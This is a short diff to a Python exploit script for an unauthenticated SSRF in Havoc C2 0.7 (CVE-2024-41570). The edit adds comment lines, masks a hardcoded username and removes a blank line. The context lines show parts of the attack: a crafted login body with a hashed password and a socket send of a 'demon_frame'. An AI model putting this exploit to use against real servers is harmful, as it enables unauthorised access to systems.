@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
+##
+##
+## 
 """
 Exploit Title: Havoc C2 0.7 Unauthenticated SSRF (CVE-2024-41570)
 Date: 2024-07-13
@@ -446,7 +448,7 @@ def main():
         "Body": {
             "Info": {
                 "Password": hashlib.sha3_256("axxxxzxxxxzxxxxxxxxxxxz".encode()).hexdigest(),
-                "User": "ilya"
+                "User": "xxxxxxxxxx"
             },
             "SubEvent": 3
         },
@@ -509,7 +511,6 @@ def main():
     send_to_socket(args.target, headers, agent_id, socket_id, demon_frame)
 
     print("[+] Exploit completed!")
-
 
 if __name__ == "__main__":
     main()
